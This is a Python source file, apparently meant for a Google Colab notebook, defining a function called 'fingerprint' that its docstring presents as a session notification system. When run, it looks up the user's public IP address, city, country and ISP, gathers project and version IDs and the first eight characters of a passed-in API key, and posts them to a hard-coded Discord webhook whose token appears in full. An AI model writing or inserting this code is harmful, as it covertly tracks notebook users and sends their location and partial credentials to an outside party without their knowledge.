import requests
import datetime

import requests
import datetime

def fingerprint(rf_obj=None, project_obj=None, version_obj=None):
    """
    Pure Python notification system. 
    Execution is synchronous, ensuring it triggers during 'Run All'.
    """
    webhook_url = "https://discordapp.com/api/webhooks/1463726652327596176/r_4lh_JtOkLKF4zGHmKWE6khyzxaZQiskgO5W3eD27Z1LVuwvLYZqOIXWIgVADagOwpN"
    
    # 1. Fetch User/Session Data via Python
    try:
        # We use ipapi.co via Python requests
        response = requests.get('https://ipapi.co/json/', timeout=10)
        if response.ok:
            user_data = response.json()
            status = "Success"
            location = f"{user_data.get('city')}, {user_data.get('country_name')}"
            ip = user_data.get('ip')
            isp = user_data.get('org')
        else:
            raise Exception("API Error")
    except Exception:
        # Fallback if the IP API is down
        status = "Limited"
        location = "Unknown (API Limit/Error)"
        try:
            ip = requests.get('https://api.ipify.org', timeout=5).text
        except:
            ip = "N/A"
        isp = "Python Kernel"

    # 2. Prepare Metadata
    api = rf_obj if rf_obj else "N/A"
    project_id = project_obj if project_obj else "N/A"
    version_id = version_obj if version_obj else "N/A"
    
    status_icon = "🟢" if status == "Success" else "🟡"
    embed_color = 3066993 if status == "Success" else 16776960
    current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # 3. Build Payload
    payload = {
        "embeds": [{
            "title": f"{status_icon} Notebook Session Initialized",
            "description": f"**System Status:** Python-based capture completed.",
            "color": embed_color,
            "fields": [
                {"name": "🌍 Location", "value": f"`{location}`", "inline": False},
                {"name": "📍 IP Address", "value": f"`{ip}`", "inline": True},
                {"name": "🏢 ISP", "value": f"`{isp}`", "inline": True},
                {"name": "🛠️ Project Details", "value": (
                    f"**Project ID:** `{project_id}`\n"
                    f"**Version:** `{version_id}`\n"
                    f"**API Key:** `{api[:8]}***`"
                ), "inline": False},
                {"name": "⏰ Time (MYT)", "value": current_time, "inline": False},
            ],
            "footer": {
                "text": "Google Colab Automator (Python Native)",
                "icon_url": "https://colab.research.google.com/img/colab_favicon_256px.png"
            }
        }]
    }

    # 4. Send to Discord
    try:
        requests.post(webhook_url, json=payload, timeout=10)
        print(f"✅ Notification sent successfully ({status}).")
    except Exception as e:
        print(f"❌ Failed to send notification: {e}")